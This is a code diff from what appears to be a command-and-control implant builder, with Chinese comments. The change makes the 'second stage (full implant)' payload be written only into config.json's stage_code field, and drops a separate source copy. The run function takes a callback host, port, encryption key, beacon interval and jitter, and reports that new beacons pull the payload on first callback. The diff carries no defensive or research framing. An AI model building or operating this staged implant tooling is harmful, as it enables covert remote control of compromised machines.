@@ -93,10 +93,10 @@ def _atomic_dump(cfg_path: str, raw: dict) -> None:
 
 
 def _write_stage2(code: str, out_dir: str = None):
-    """把第二段(完整植入物)写入 config.json 的 stage_code + output 源码副本。
+    """把第二段(完整植入物)写入 config.json 的 stage_code(原子写)。
 
-    返回 (ok, info)。out_dir 缺省 _DEFAULT_OUT(2026-09-04 B15: 显式
-    out_dir 传入时源码副本与单段产物落同一目录, 此前固定 _DEFAULT_OUT)。
+    只更新 config 不落 output 副本文件(2026-09-04 用户要求: 二阶段载荷
+    只需在 config 里更新, 无需 output 文件)。返回 (ok, message)。
     """
     try:
         with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
@@ -108,15 +108,7 @@ def _write_stage2(code: str, out_dir: str = None):
         _atomic_dump(_CONFIG_PATH, raw)
     except OSError as e:
         return False, f"config.json 写入失败: {e}"
-    out = out_dir or _DEFAULT_OUT
-    os.makedirs(out, exist_ok=True)
-    src_path = os.path.join(out, "stage2_code.py")
-    try:
-        with open(src_path, "w", encoding="utf-8") as f:
-            f.write(code)
-    except OSError as e:
-        return False, f"stage2_code.py 写入失败: {e}"
-    return True, src_path
+    return True, f"config.json(stage_code) 已更新, {len(code)} 字节"
 
 
 def _resolve_key(key_hex):
@@ -199,20 +191,18 @@ def run(host, port, key_hex=None, interval=60, jitter=0.2, out_dir=None,
         return {"status": "error",
                 "message": f"第一段(引导)生成失败: {st}"}
 
-    ok_w, info = _write_stage2(rendered, out_dir)
+    ok_w, info = _write_stage2(rendered)
     if not ok_w:
         return {"status": "error", "message": f"第二段写入失败: {info}"}
 
     files = dict(st.get("files") or {})
-    files["stage2_source"] = info
     return {
         "status": "ok",
         "mode": "staged",
         "key": key.hex(),
         "deploy": st.get("deploy", ""),
         "files": files,
-        "stage2": (f"已自动写入 config.json(stage_code) 与 "
-                   f"{os.path.basename(info)}（{len(rendered)} 字节）; "
+        "stage2": (f"已写入 config.json(stage_code, {len(rendered)} 字节); "
                    f"新 beacon 首次回连即下发。运行中执行 reload 立即生效。"),
     }
 
